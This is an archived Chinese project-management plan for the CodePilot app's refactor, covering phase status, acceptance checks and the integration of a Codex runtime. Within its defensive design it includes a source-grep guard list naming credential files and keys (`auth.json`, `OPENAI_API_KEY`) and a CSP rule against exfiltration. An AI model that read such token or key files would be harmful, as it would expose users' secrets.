> **Archive note（2026-06-05，document-system-governance）**：本计划已完成并移出 `active/`，归入 `completed/`——重构主体已收口并随 v0.55.0 / v0.55.1 发布；本文件作为重构收口历史归档。作为历史执行记录保留；当前任务入口见 [exec-plans README](../README.md)。

# Refactor Closeout / 重构收口计划（总控板）

> 创建：2026-05-06 · 最后更新：2026-05-29（Phase 0-6 / Phase 8 已完成并归档；**Phase 7 视觉锚点与图标体系进行中**——图标体系 Phase 0-3、视觉锚点首批、macOS 视觉 7b Phase 0-2、浮动卡片 7c 均已落地，剩 图标 Phase 4 文档收口 + 7b Phase 3-5；当前在做整体收尾——文档状态校准 + tech-debt 排序）
> 这是日常入口；查历史细节请走"历史归档"列（`completed/refactor-phase-*.md` + `completed/phase-4-markdown-artifact.md`），不要在本文件里翻 1000 行决策日志。
> **协作边界**：Codex 负责计划制定、方案审查和 Review；ClaudeCode 负责执行代码改动、测试和提交整理。除非用户明确重新授权，Codex 只能改 `docs/` 下的计划 / 交接 / review 文档，不再直接改业务代码。
> **上下文同步纪律**：交给 ClaudeCode 的内容不能只给"最终结论"或任务清单，必须同时写清楚讨论过程、判断依据、被否掉的方案和为什么否掉。尤其是架构 / Runtime / 权限 / provider / 安全边界相关任务，Codex 的交接文案需要包含：用户原始诉求 → 中间争议 → 取舍理由 → 当前决定 → 不做边界 → 审查重点。这样 ClaudeCode 重启或上下文较短时，也能继承判断过程，而不是重新踩同一个坑。
> **Superseded breadcrumb（2026-08-25）**：本归档里 Phase 3/7c 的 FileTree + Workspace 两栏形态已由 Active index 中的 `workspace-surface-sidebar-pin-and-inspector.md` 取代；现行合同是单一 Workspace shell、Primary + Inspector、repository-scoped pin 与 thread-scoped preview。

## 当前状态

| 顺序 | 主线 | 用户视角结果 | 状态 | 历史归档 |
|------|------|--------------|------|----------|
| 0 | 计划收敛 | Active 计划只剩本计划 + issue-tracker | ✅ 已完成（2026-05-06） | [phase-1](../completed/refactor-phase-1-models-providers.md) |
| 1 | 模型同步与渠道扩展 | 添加服务商不再被无关模型污染；OpenRouter 走搜索；默认模型不乱跳 | ✅ 主路径完成（catalog 主动核准持续跟踪 tech-debt #16） | [phase-1](../completed/refactor-phase-1-models-providers.md) |
| 2 | Runtime 与会话执行 | 每个会话能解释 / 能切换"执行引擎"；旧会话不被全局漂移；下一条消息生效 | ✅ Step 1-4c 全部完成（2026-05-07） | [phase-2](../completed/refactor-phase-2-runtime-session.md) |
| 3 | 后台常驻、全局定时任务、助理心跳与通知 | 关窗常驻菜单栏；reminder 不依赖 AI；本机通知 / Bridge 解耦；全局任务页；后台 Agent 任务 + 后台心跳 | ✅ 全部完成（2026-05-10）：Step 1-3 + IA 收尾 + Step 4a（任务会话壳 + 文本生成 + 心跳后台化）+ Step 4b（headless streamClaude + waiting_for_permission 可达 + WaitingForPermissionPanel） | [phase-3](../completed/refactor-phase-3-background-tasks-notifications.md) |
| 4 | Markdown / Artifact 稳定与表现层 | Markdown 作为数据层；HTML / Artifact 作为表现层；外部资源、安全沙箱、工程输出引用 | ✅ 全部完成（2026-05-12）：trust tier + html-preview 同源路由 + CSP 4 轮 + Markdown 原地风格 + Artifact code-fence / dev-output。HTML Artifact 显式保存入口 deferred（tech-debt #18） | [phase-4](../completed/phase-4-markdown-artifact.md) |
| 5 | Codex Runtime 接入 | Codex 像 Claude Code 一样成为同级 Runtime；Codex Account 主链路、CodePilot provider proxy、Tool Bridge、Runtime / Provider / Harness 边界已收口 | ✅ 全部完成并归档（2026-05-19）：Codex app-server + account/model sync + Runtime adapter + provider proxy translator + OpenRouter/OAuth 收口 + Tool Bridge + Phase 5e Harness 架构 | [phase-5](../completed/phase-5-codex-runtime.md) · [phase-5c](../completed/phase-5c-codex-tool-bridge.md) · [phase-5d](../completed/phase-5d-harness-capability-contract.md) · [phase-5e](../completed/phase-5e-runtime-harness-architecture.md) |
| 5b | Codex provider proxy translator | 让 Codex Runtime 使用 CodePilot 已配置 provider；除 Claude Code 默认/env 模式外，与 CodePilot Runtime 模型能力对齐 | ✅ 已完成（2026-05-19）：Responses SSE / tool schema / retry lifecycle / OAuth refresh / OpenRouter Anthropic-skin + legacy alias canonicalization / thread resume 注入均已收口；真实 OpenRouter haiku 两轮 smoke 通过，同 session provider binding 保持一致 | [phase-5](../completed/phase-5-codex-runtime.md) |
| 5c | CodePilot Tool Bridge for Codex | Codex Runtime 下，CodePilot 自有 Memory / Tasks / Widget / Image / Media 等能被感知、调用并回到 UI；Dashboard / CLI / assistant_buddy 在 Codex 下诚实降级（**Phase 8 收口后 Dashboard / CLI 已翻为可调用**——read 自动 / write 弹审批；assistant_buddy 仍按当前能力矩阵为准）| ✅ 实现 + Harness 收口完成；Codex 不支持项在 Settings 与聊天工具结果下方用用户语言提示 | [phase-5](../completed/phase-5-codex-runtime.md) · [phase-5c](../completed/phase-5c-codex-tool-bridge.md) · [phase-5e](../completed/phase-5e-runtime-harness-architecture.md) · [phase-8](../completed/phase-8-codex-mcp-context-injection.md) |
| 6 | 上下文可视化 | 输入框右下角是组成条而不是单一百分比；popover 展示来源分解与三 Runtime context-accounting | ✅ 已完成并归档（2026-05-20） | [phase-6](../completed/phase-6-context-visualization.md) · [context-accounting](../completed/context-accounting-runtime-contract.md) |
| 7 | 视觉锚点与图标体系 | 图标库与表意收敛 + macOS 平台视觉 + 浮动卡片 primitive；点阵风格视觉记忆点后续扩展 | 🔄 进行中：图标 Phase 0-4 ✅ 已归档 · 视觉锚点首批 ✅（应用图标 / 欢迎布局 / widget 点阵）· macOS 7b Phase 0-2 ✅（3-5 用户决定不做）· 卡片 7c ✅ 已归档；剩 点阵 loading / 空状态（另开子计划） | [phase-7-icons](../completed/phase-7-icon-system.md) · [phase-7b](./phase-7b-macos-native-visual-profile.md) · [phase-7c](../completed/phase-7c-card-primitive.md) |
| 8 | Codex MCP / Memory 注入 | 5 项核心能力（Memory / Widget / Tasks+Notify / Dashboard / CLI）在 Codex Account 下真账号 smoke 通过；图片入库对齐素材库；不可行 / 用户 defer 路径在 Settings 诚实降级 | ✅ 已完成并归档（2026-05-29）：5 项 smoke 通过 + read 自动 / write 弹审批的 elicitation 策略 + Codex 原生图片入库；Image/Media（不叠加 Gemini）+ 用户自定义 MCP（独立工程）用户明确 defer | [phase-8-codex-mcp](../completed/phase-8-codex-mcp-context-injection.md) |

## 下一步

**Phase 6 已完成并归档**。输入框右下角的 context 入口已升级为点阵式组成条，popover 展示来源分解；三 Runtime 的 context-accounting 数据契约、持久化、真实 smoke evidence 已收口。完整历史见 [completed/phase-6-context-visualization.md](../completed/phase-6-context-visualization.md) 与 [completed/context-accounting-runtime-contract.md](../completed/context-accounting-runtime-contract.md)。

**后续不是 Phase 5 阻塞项**：

- `@openai/codex-sdk` execution POC 仍可作为后续研究：control plane 继续保留 app-server，execution plane 是否切 SDK 需要单独 POC。
- Codex MCP / Memory 注入 [Phase 8](../completed/phase-8-codex-mcp-context-injection.md) **已完成并归档（2026-05-29）**：5 项核心能力（Memory / Widget / Tasks+Notify / Dashboard / CLI）在 Codex Account 下真账号 smoke 通过 + 按能力区分的 elicitation 审批策略（read 自动 / write 弹审批；Dashboard / CLI 拆 read+write 两 server）+ Codex 原生图片入库已对齐素材库。**用户明确 defer 两项**：Image/Media 不叠加 App 的 Gemini 图片 MCP（Codex 自带够用）；用户自定义 MCP 是独立工程（transport / OAuth / 白名单），后续单独立项。
- Dashboard / CLI **已变成可调用**（read 自动 / write 弹审批），不再是诚实降级状态；上一句中保留的「诚实降级」泛指 Image/Media + 用户 MCP + 旧版 Dashboard/CLI 桥之前的状态，现 Phase 8 收口后只剩 Image/Media 与用户 MCP 在 Settings 里诚实标 defer。
- Phase 7（视觉锚点与图标体系）已完成大部分：[图标体系与表意校准](../completed/phase-7-icon-system.md) Phase 0-4 全部完成并归档（HugeIcons 主库迁移、CodePilot semantic icon layer、重复图标收敛、direct-import guardrail、Phase 4 文档收口）；[macOS 平台视觉 7b](./phase-7b-macos-native-visual-profile.md) 收口于 Phase 0-2（3-5 用户 2026-05-29 决定不做）+ [浮动卡片 primitive 7c](../completed/phase-7c-card-primitive.md) 已归档；只剩 点阵 loading / 空状态 / 背景纹理（视觉锚点第二批，另开子计划）。

### Phase 3 Step 4（完成 2026-05-10）：后台 Agent 任务与助理心跳闭环

Phase 3 Step 4 已拆成两批并全部完成：

- **Step 4a**：任务会话壳、`messages.task_run_id`、`<TaskRunMarker />`、`task_run_logs` 5 态应用层白名单、心跳系统任务、Tasks 页 5 态展示、Assistant 心跳频率。
- **Step 4b**：后台 `runScheduledAgentTask` 切到 headless `streamClaude`，支持真实工具调用、`permission_request → waiting_for_permission`、`<TaskWaitingForPermissionPanel />` 的重跑 / 放弃动作。
- **后续修正**：任务创建时注入 `origin_session_id` / `working_directory`，task-bound session 只复用 `source='task'`，heartbeat 路径硬隔离 MCP / `settingSources`，后台任务失败不再污染最近用户会话。

当前边界：

| 概念 | `kind` | `source` | 行为 |
|---|---|---|---|
| 提醒 | `reminder` | `user` | 到点直接通知，不调用 AI。 |
| 用户创建的 AI 任务 | `ai_task` | `user` | 到点创建 / 复用 task-bound session，走 headless Agent 执行链，结果和工具事件落入任务会话。 |
| 助理心跳 | `ai_task` | `assistant_heartbeat` | 后台按频率检查 `HEARTBEAT.md`；只允许 memory 工具；`HEARTBEAT_OK` 静默，否则写入 buddy session 并通知。 |

剩余明确不做：

- 不做 durable agent state resume；权限请求后只提供重跑 / 放弃，不从断点继续。
- 不做 cron 表达式编辑器、跨 Agent 调度接管、心跳频率低于 1 小时、跨设备同步。
- 不把 task-bound session 放进主聊天列表；只能从 Tasks 页、通知、直接 URL 进入。

Phase 3 验收入口：

- 浏览器主流程：`/settings/tasks` 列表 + 执行记录、`/chat?prefill=...`、模型切换解锁、任务会话 marker / waiting panel。
- Electron 原生 smoke：关窗常驻、菜单栏打开 / 退出、后台通知、通知点击路由到任务页或 task session。
- 自动化：`npm run test`、`npx next build`、`node scripts/build-electron.mjs`。

## 未闭环风险 / TODO

当前 active 总控板无 Phase 1-3 阻塞 TODO。已修问题和历史根因放在对应 phase archive；真正暂缓或产品未排期事项放在下方"暂缓清单"或 `docs/exec-plans/tech-debt-tracker.md`。

## 验收入口

> 把每条主线"在哪个页面 / 命令能验"集中放这里。日常想确认某条是否还在工作，按这里走。

- **Phase 1**：Settings → Providers（添加套餐型服务商不报 discovery 失败）；Settings → Models（OpenRouter 走搜索；套餐型模型不出现 100+ 上游目录）；Chat 新会话默认模型按钮显示 `<provider>·<model>`。
- **Phase 2**：composer 工具栏 `[模式] [对话引擎] [权限]` 三联可见；切 RuntimeSelector → /chat 即时按新 runtime 过滤；删除当前会话 provider → 发送返回 409 INVALID_SESSION_PROVIDER 横幅；切换后 transcript 出现 "已切换执行引擎：X → Y" marker。
- **Phase 3**：创建一个"+1 分钟" reminder（不配 provider）→ 关窗 → 等到点 → macOS 系统通知弹出 → 点通知落到 `Settings → 定时任务` + 焦点该任务 + 展开看到 delivery log；浏览器直接 POST `/api/tasks/schedule` 带 `notify_on_complete: true` 返回 200 + DB row 1。

## 暂缓清单

不主动开工的（用户决议或不在本轮 6 条主线内）：

- Run Checkpoint Round 3（PermissionPrompt 视觉收编，2026-04-30 用户决定）
- 更多 Bridge 渠道（微信 / QQ Bridge — 单独计划在 active）
- 插件市场深度功能、浮窗助理、自动多 Agent 编排
- 全 provider billing / usage API
- Memory 管理面板
- 大规模官网 / 文档站工作

## Phase 4 / 5 / 6 / 7 方案

> Phase 4 当前只跟 Markdown / Artifact 有关。Codex Runtime 已作为 Phase 5 单独立项；OpenClaw / Hermes 兼容、多 Agent 调度、上下文可视化继续拆在后续阶段，避免和 Runtime 接入互相污染。

### Phase 4：Markdown / Artifact 稳定与表现层

> 进度：**已完成并归档（2026-05-12）**。
>
> 子计划归档于 [`completed/phase-4-markdown-artifact.md`](../completed/phase-4-markdown-artifact.md)；技术交接见 [`handover/phase-4-markdown-artifact.md`](../../handover/phase-4-markdown-artifact.md)，产品思考见 [`insights/phase-4-markdown-artifact.md`](../../insights/phase-4-markdown-artifact.md)。该批次沉淀 Markdown-as-data / HTML-as-presentation 的产品判断、资源安全策略和验收样本。

#### 用户结果

1. Markdown 可以作为可信数据层使用：工作区内文件可编辑，外部文件可只读授权打开，AI / 用户改动后预览会自动刷新，编辑冲突不会被静默覆盖。
2. Markdown 预览不再只是大段文本：frontmatter、heading anchor、wikilink、Obsidian callout、选区加入对话都能直接交互。
3. HTML / Artifact 有明确安全边界：本地相对资源可解析；Static / Interactive 两档沙箱分清楚；Interactive 不允许外联泄漏。
4. 代码块可以一键进入 Artifact：HTML / JSX / JSON / diff / CSV / Markdown 都有对应富预览或安全降级。
5. Markdown 打开即按默认 Article 风格渲染；用户可用 Select 切 Default / Article / Report / Brief / Pitch；切样式原地切 CSS，不弹窗、不写盘。显式的 HTML Artifact 导出入口 deferred（见 tech-debt-tracker #18）。
6. 工程聊天输出里的文件路径、line fragment、diff fence、localhost URL 能变成可点击 chip，不再停留在普通文本。

#### 已完成范围

| 模块 | 当前结果 |
|---|---|
| PreviewSource trust tier | `workspace / user-selected / agent-referenced` 三档；AI 提到外部文件先确认，确认后只读打开。 |
| Markdown 文件刷新 | `codepilot:file-changed` 触发安静刷新；dirty buffer 显示冲突条。 |
| HTML 文件预览 | `/api/files/html-preview/[scope]/...` 同源路由；relative CSS/img/script 按 scope 解析；CSP 从 `default-src 'none'` 起步。 |
| HTML Interactive | 只开放脚本执行，不开放 `allow-same-origin`，并撤销所有 `https:` 外联资源，堵住 URL-shaped exfiltration。 |
| Markdown 数据交互 | frontmatter、wikilink、callout、heading anchor、选区加入对话。 |
| Artifact routing | code-fence Preview action + inline-json / inline-diff / inline-datatable / inline-markdown / inline-html / inline-jsx。 |
| Markdown 表现层 | in-place presentation Select + quiet refresh。HTML Artifact 显式保存入口 deferred（helpers 保留，详见 tech-debt-tracker #18）。 |
| 工程输出引用 | 本地文件 chip、Markdown 链接拦截、bare filename resolution、localhost Browser / Artifact chip。 |

#### 验收入口

- `/chat/<id>` 打开右侧文件树，预览一个 workspace `.md`：默认 Article 样式、Select 原地切换、自动刷新、编辑冲突横幅。显式 Export / Save HTML deferred（tech-debt #18），头部不提供按钮。
- 打开一个 workspace `.html`：相对 CSS / 图片可见；Static / Interactive Select 文案正确；Interactive 下外联被 CSP 阻断。
- 打开一个外部 Markdown / HTML：先出现授权卡；确认后只读打开；同目录静态资源刷新正常。
- 在聊天消息里测试 `README.md:12`、`/abs/path/file.md#L12`、```diff、```json、localhost URL：chip / Preview action 对应正确。
- 自动化：`npm run test`、`npx next build`，涉及 UI 后用 Browser/CDP 做 smoke。

#### 不做

- 不做 Codex Runtime / Local Agent Adapter，不做 `@codex` 入口；这些后续单独计划。
- 不做全 vault 索引、反向链接图、WYSIWYG Markdown 编辑器。
- 不做远端 E2B / Vercel Sandbox 上传执行；当前 HTML/JSX 预览仍本地、安全、显式授权。
- 不让外部只读 Markdown 因为“能预览”就静默写盘；显式 HTML Artifact 导出入口 deferred（tech-debt-tracker #18）。

### Phase 5：Codex Runtime 接入

> 进度：**✅ 已完成并归档**。Phase 5b provider proxy translator、Phase 5c Tool Bridge、Phase 5d/5e Harness 架构与 Settings 能力清单均已收口。
>
> 子计划见 [`completed/phase-5-codex-runtime.md`](../completed/phase-5-codex-runtime.md)。本阶段目标是把 Codex 像 Claude Code 一样接入为可选 Runtime，而不是做上下文可视化。

- **已落地**：Runtime Contract Hardening、`codex app-server` 管理层、`account/read` / login flow、`model/list` → `Codex Account`、Runtime registry `codex_runtime`、thread / turn / item / file-change / approval / token usage 映射、Codex Account chat 主链路、Phase 5b CodePilot provider proxy translator（基于 ai-sdk `createModel()` + `streamText` 的统一翻译层，同一份实现覆盖 OpenAI-compatible / Anthropic-compatible / CodePlan 三家族；`getModelCompat` 让对应 tier 的 `supportedRuntimes` 加入 `codex_runtime`），`CodexRuntime.stream()` 真正注入 `model_providers.codepilot_proxy` 到 `thread/start` 与 `thread/resume`（共享 `buildCodexThreadParams` 一个 helper，guardrail 测试 source-grep runtime.ts 保证两条路径都 spread 同一 params 对象），session 持久化 `codex_thread_provider_id` 防止跨 provider 误 resume；env provider 在 API + runtime 双层显式排除；`VIRTUAL_PROVIDERS` registry 在 proxy 端正确解析 `openai-oauth` 等虚拟 provider（unified-adapter 改用 `input.targetProviderId` 而不是 `resolved.provider?.id`），并有 API contract 测试保证 `runtime=codex_runtime` 暴露的所有 id 都能被 proxy resolve；unit 测试通过 `CODEX_DISABLED=1` 与真实 Codex app-server 解耦。Codex 原生 shell/file smoke 可跑。
- **已收口**：Phase 5b 真实 provider smoke 已完成最终阻塞项，OpenRouter haiku 两轮续聊验证通过；Phase 5c/5e 已把 CodePilot 自有 Memory / Tasks / Widget / Image / Media 等能力接入 Harness Bundle，Dashboard / CLI / Codex Account 不支持能力在 Settings 与工具提示中诚实降级。`unknown` tier 维持 disabled（proxy 推不出 wire format）。
- **不做**：不解析 `codex exec` 文本作为主协议；不读取 `~/.codex` token 文件；不把 Codex 降级成 `Codex Account only` 轻入口；不把“proxy translator 暂未覆盖”误写成永久不支持；不做上下文可视化。

### Phase 6：上下文可视化

> 进度：**✅ 已完成并归档（2026-05-20）**。
>
> 子计划见 [`completed/phase-6-context-visualization.md`](../completed/phase-6-context-visualization.md)；真实数据契约与 smoke evidence 见 [`completed/context-accounting-runtime-contract.md`](../completed/context-accounting-runtime-contract.md)。

- **用户结果**：输入框右下角不只是百分比，而是点阵组成条；popover 展示上下文来源分解、剩余容量和分类 token 数。
- **已落地**：Context Breakdown UI、点阵 mini/main bar、RunCockpit 接入、三 Runtime context-accounting producer、ToolInvocation 统一抽象、真实 smoke / DB evidence。
- **剩余非阻塞**：tech-debt #22（selectedSkills 同名歧义）与 #24（footer cost 双计）。

### Phase 7：视觉锚点与图标体系

> 进度：**🔄 进行中**。图标体系 [`phase-7-icon-system.md`](../completed/phase-7-icon-system.md) Phase 0-4 ✅ 已归档；macOS 平台视觉 [`phase-7b`](./phase-7b-macos-native-visual-profile.md) 收口于 Phase 0-2（3-5 用户决定不做）、浮动卡片 [`phase-7c`](../completed/phase-7c-card-primitive.md) ✅ 已归档；只剩 点阵 loading / 空状态 / 背景（视觉锚点第二批，另开子计划）。

- **用户结果**：设置页、聊天输入框、工具结果、插件 / Skills / MCP / CLI 等高频区域的图标更清楚；同一概念用同一个图标，不同概念不再共用 Brain / Lightning / Terminal 等泛化图标；macOS 下窗口壳层 / 顶栏 / 侧栏 / 浮动卡片更像原生应用。
- **已落地**：图标 semantic layer（`semantic-icon.tsx`，96 文件迁到 CodePilotIcon）+ Brain/Lightning/Terminal 永久禁用 guardrail；新应用图标 MonolithIcon + 居中欢迎布局 + widget 点阵卡；macOS `data-platform` + 平台 token 层 + 壳层材质 + CardFrame/CardSurface/ResizeGutter 浮动卡片 primitive。
- **剩余**：仅 点阵 loading / 空状态 / 背景纹理（视觉锚点第二批，另开子计划）。图标 Phase 4 已收口并归档；7b Phase 3-5 用户 2026-05-29 决定不做。
- **不做**：一口气全局重做 UI；点阵铺满所有卡片；macOS 分叉页面内容。

## 最近决策（当前收口状态）

> 完整决策日志按 Phase 归档，见 `completed/refactor-phase-*.md` + `completed/phase-4-markdown-artifact.md` + `completed/phase-5*.md`。本节优先看顶部最新条目；较早条目保留为过程记录，若与顶部状态冲突，以最新 closeout 为准。

- 2026-05-29：**Phase 7 状态校准 + 进入整体收尾**。核对发现总控板把 Phase 7 标成"待开始"与现实严重不符：图标体系 Phase 0-3、视觉锚点首批（MonolithIcon / 欢迎布局 / widget 点阵）、macOS 视觉 7b Phase 0-2、浮动卡片 7c 均已落地提交，且总控板此前**完全未提 7b / 7c 两份子计划**。本轮校准：(1) 总控板 Phase 7 行 + 下一步 + Phase 7 方案改为"🔄 进行中"并补 7b/7c 链接；(2) 7c（A-H 完成、Codex 复审、验收证据入 handover）归档到 `completed/`；(3) 图标 Phase 4 文档收口（design-system Icon 区 / design.md 图标语义 / ui-governance §2 交接 / `insights/icon-system.md`）+ 补 `insights/macos-visual-profile.md`，图标计划随之归档；(4) **tech-debt 收尾优先级建议**：#34（Mac 定时任务不弹通知）→ #27（pin-incomplete 误报模型不可用）→ #26（Plan 模式无法建 Widget）→ #30（pre-commit 不 enforce eslint）→ #28（Windows shell 方言，独立 slice）。剩 7b Phase 3-5 + 点阵 loading / 空状态为后续主线。
- 2026-05-20：**Phase 6 上下文可视化 / context-accounting 完成并归档**。Phase 6 的点阵式 context breakdown UI 与 Phase 7 context-accounting 数据契约已合并收口：三 Runtime 均通过 producer 落 `result.usage.context_breakdown`，真实 smoke / DB evidence 已归档到 `completed/_smoke-evidence-phase-7/`。下一条主线转入 Phase 7 视觉锚点与图标体系。
- 2026-05-21：**Phase 7 第一刀改为图标体系与表意校准**。用户明确指出当前图标重复使用、表意不清；决定先立 [`phase-7-icon-system.md`](../completed/phase-7-icon-system.md)，用 HugeIcons 作为主图标库目标，但先建 CodePilot semantic icon layer 与 icon inventory，再迁移高频 UI。品牌图标继续保留 LobeHub；点阵背景 / loading / 空状态排在图标语义稳定之后。
- 2026-05-19：**Phase 5 Codex Runtime / Harness 主线完成并归档**。Phase 5b provider proxy translator 的最后阻塞项（OpenRouter legacy alias / Anthropic-skin / OAuth refresh / installed_idle 状态文案）已闭环；OpenRouter haiku 在 Codex Runtime 下两轮真实 smoke 通过，同一 session 的 `codex_thread_provider_id` 绑定保持一致。Phase 5c Tool Bridge 与 Phase 5d/5e Harness 架构已归档；CodePilot 自有 Memory / Tasks / Widget / Image / Media 等能力经 Harness Bundle / capability matrix / Settings 能力清单收口，不支持能力用用户可读文案诚实降级。下一条主线转入 Phase 6 上下文可视化。
- 2026-05-12：**Phase 5 改为 Codex Runtime 接入**。上下文可视化顺延到 Phase 6；Phase 5 目标是让 Codex 像 Claude Code 一样成为 CodePilot 同级 Runtime，既读取 Codex 登录账号模型，也接入 Codex 原生工具 / 命令 / 插件式 item / 文件改动 / 权限事件；同时通过 CodePilot Responses-compatible proxy 交付现有 provider / CodePlan 模型的可用路径。用户明确否决 `Codex Account only` 的降级口径。为避免三套 runtime invariant 污染 UI，Phase 5 增加 `Runtime Contract Hardening` 前置：session / permission / model / event / preview metadata 必须先收口，再接 Codex。
- 2026-05-16：**Phase 5c CodePilot Tool Bridge 计划补入**。真实 smoke 证明 Codex 原生 shell/file 能跑，但 CodePilot 自有工具还未真正接入：明确要求 `codepilot_memory_recent` / `codepilot_list_tasks` 后未产生对应工具调用。用户底线是 Widget、助理 Memory、定时任务、图片 / 媒体、Dashboard、CLI tools 等 CodePilot 产品层能力不能因切换 Codex Runtime 消失。计划要求从 `BUILTIN_MCP_CATALOG` 生成 capability matrix，桥接工具可见性 / 调用 / 结果渲染，并用每个能力族真实 smoke 验收。
- 2026-05-16：**Phase 5c CodePilot Tool Bridge 实现 + 单测 + 文档落地**。两次切片提交完成：(slice 1) parse-request tools[] 分类（function / 已知 non-function / 未知 → 结构化错误，停止静默丢弃）、proxy header 扩展（`x-codepilot-session-id` / `x-codepilot-workspace-path`）、side-channel event bus；(slice 2) `builtin-bridge.ts` 工具集（image / media import / memory / widget / notify / tasks）、unified-adapter 集成 + `stopWhen: stepCountIs(8)`、translate-stream/response 抑制内建工具 function_call、runtime.ts 订阅事件总线、anti-pattern source-grep 守卫（`auth.json` / `npm install` / `OPENAI_API_KEY` / `image_gen.py`）、Codex Account 双层守卫（adapter routingBug + bridge 拒挂）。Phase 5c 现状 🔄：实现 + 单测全绿（2495 tests），文档 `docs/handover/codex-tool-bridge.md` + `docs/insights/codex-tool-bridge.md` 已落地，**用户必须跑 6 类能力族真实 smoke**（Codex Account 原生 / GLM 图片 / Kimi 图片 / GLM widget / GLM memory / GLM tasks）才能标 ✅。Dashboard + CLI tools 工具族 deferred。
- 2026-05-16：**Phase 5c slice 4 parity 修复**。Review 指出三处实现与 schema/description 承诺不一致：(P1) `codepilot_schedule_task` 暴露 `durable` 但执行始终 POST `/api/tasks/schedule`，session-only 任务被持久化；list 不合并 `getSessionTasks()`；cancel 不查 session map → 全部对齐 `notification-mcp.ts` 行为，durable=false 走 `addSessionTask`，list 合并并标 "Session-only"，cancel 优先 `removeSessionTask`。(P2) `codepilot_memory_search` schema 声明 `tags` + `file_type` 但 execute 忽略 → 现按 `memory-search-mcp.ts` 实现 file_type 路径过滤 + tags 经 `loadManifest` 过滤，manifest 缺失静默退化。(P2) `codepilot_import_media` 描述说支持 image/video/audio 但 MediaBlock.type 固定 'image' → 新增 `mediaTypeOf` helper 按 mimeType 前缀分发，与 `media-saver.mimeToMediaType` 同源。新增 `codex-builtin-bridge-parity.test.ts`（11 pins）覆盖 durable/list/cancel parity + memory filter source pins + media type 推断 source pin。2506 tests pass.
- 2026-05-16：**Phase 5c slice 5 post-smoke 修复**。用户跑 6 条 smoke 矩阵：Codex Account + GPT-Image ✅；GLM-5 Turbo / Kimi + Codex Runtime + 图片桥 ❌ — proxy 在 parser 阶段 400，错误 `tools[17] has unsupported type "namespace"`。继续跑后面的 smoke 没意义（同样 400），只算 1/6 通过。两处根因：(1) slice 1 我的 `KNOWN_NON_FUNCTION_TYPES` 是 speculation 不是 source-truth，缺 `namespace` / `tool_search` / `local_shell`（Codex `ToolSpec` enum 实际 emit 的三个 type），还多了 `plugin` / `file_search` / `code_interpreter` / `web_search_preview` 四个 speculation 项 → 全部按 `资料/codex/codex-rs/tools/src/tool_spec.rs` 重写。(2) chat route 持久化条件是 `contentBlocks.length > 0`，preflight 错误只有 error event 没 text/tool，refresh 后只剩用户气泡 → 主路径 + catch 路径都加 fallback：`hasError && contentBlocks.length === 0` 时 push `**Error:** <message>` 文本块再持久化，文案与 `stream-session-manager.ts:864` 同源。新增 `codex-proxy-namespace-tool.test.ts`（7 pins，用 `资料/codex/codex-rs/tools/src/tool_spec_tests.rs:154-196` 的真实 namespace wire shape）+ `codex-proxy-error-visibility.test.ts`（3 pins）。2516 tests pass. **Phase 5c 仍 🔄；用户需重跑剩余 5 条 smoke（GLM 图片 / Kimi 图片 / GLM widget / GLM memory / GLM tasks）。**
- 2026-05-16：**Phase 5c slice 6 widget 格式硬化**。第二轮 smoke 5/6 ✅：GLM 图片 / Kimi 图片 / GLM memory / GLM tasks 全部通过。但 S4 GLM widget 自然提示下模型误调用 `codepilot_generate_image` + 输出 raw HTML 的 `show-widget` fence，UI 不渲染（S4b 显式要求 JSON wrapper 才 OK）。根因：原 widget 指南把 wire format 跟 14 条规则混在一起、on-demand `getGuidelines()` 完全不提 wrapper、image-gen 工具没禁用、渲染器把格式错的 fence 静默丢掉。四道防线：(1) 提取 `WIDGET_WIRE_FORMAT_SPEC` 作为唯一来源，系统提示 + `getGuidelines()` 都引用；(2) `getGuidelines()` 输出前置 wire format spec + “below HTML/SVG 是 INSIDE widget_code”提醒；(3) 系统提示 + bridge WIDGET_PROMPT 都明示 widget 任务期间禁调 `codepilot_generate_image`；(4) `MessageItem.parseAllShowWidgets` 新增 `malformed_widget` segment，三类失败（raw HTML 体 / 缺 widget_code / JSON 解析错）渲染成 `MalformedWidgetNotice` 警告卡（含原 fence body 可展开）。同时 `WIDGET_SYSTEM_PROMPT` 长度上限从 2000 升至 3500（新增 ~1100 字符是为了规避 S4 失败）。新增 `codex-widget-format-contract.test.ts`（12 pins，端到端 spec → 系统提示 → 桥提示 → 渲染层）。2528 tests pass. **Phase 5c 仍 🔄；用户需重跑 S4 widget smoke 验收。**
- 2026-05-16：**Phase 5d Phase 0+1 — Harness Capability Contract 落地**。Phase 5c slice 6 之后用户判断停掉"一个 bug 一个补丁"节奏，把跨 Runtime Harness 能力抽成单一契约。Phase 0 事实审计：发现 widget × 3 / memory × 2 / notify × 2 等独立 prompt 副本各自漂移。Phase 1 实现：(1) 新模块 `src/lib/harness/capability-contract.ts` 持有 7 个 capability（widget/memory/tasks_and_notify/image_generation/media_import live + dashboard/cli_tools deferred）的三 Runtime 暴露 + canonical prompt 指向；(2) Widget JSON 示例从 `\\\"` 双重转义改成单引号 HTML 属性（slice 6 的示例机器读不通，slice 7 修），新增 `CANONICAL_SHOW_WIDGET_JSON` 导出供契约测试 round-trip；(3) `src/lib/builtin-tools/widget-guidelines.ts` 删除 abridged 副本，改为 `import + re-export` 权威；(4) `src/lib/codex/proxy/builtin-bridge.ts WIDGET_PROMPT = CANONICAL_WIDGET_SYSTEM_PROMPT`（零 paraphrase）；(5) `harness-capability-contract.test.ts`（21 pins）覆盖 catalog 完整性、工具名一致性、Codex bridge widget drift 严格检测、Widget JSON round-trip（JSON.parse + parseAllShowWidgets 必须返回 widget）、media render path、状态-暴露一致性、真实 mount 验证；(6) handover doc `docs/handover/harness-capability-contract.md` + insights doc `docs/insights/harness-capability-contract.md`（三层模型、能力矩阵、新 Runtime 接入硬性流程、反模式记录）。Native memory + Native tasks + Native image gen 仍存在 prompt/MediaBlock drift，已记 tech-debt（slice 8）。2544 tests pass。**Phase 5d Phase 0+1 ✅；Phase 2-5 待开。Phase 5c S4 widget 复测仍需用户验证 — 但因为 widget de-drift + JSON.parse 校验，再失败几率显著降低。**
